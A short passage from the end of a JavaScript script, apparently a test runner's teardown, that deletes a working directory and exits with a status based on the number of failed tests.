    fs.rmSync(dir, { recursive: true, force: true });
  } catch (e) {
    /* ignore */
  }
  app.exit(failed === 0 ? 0 : 1);
});
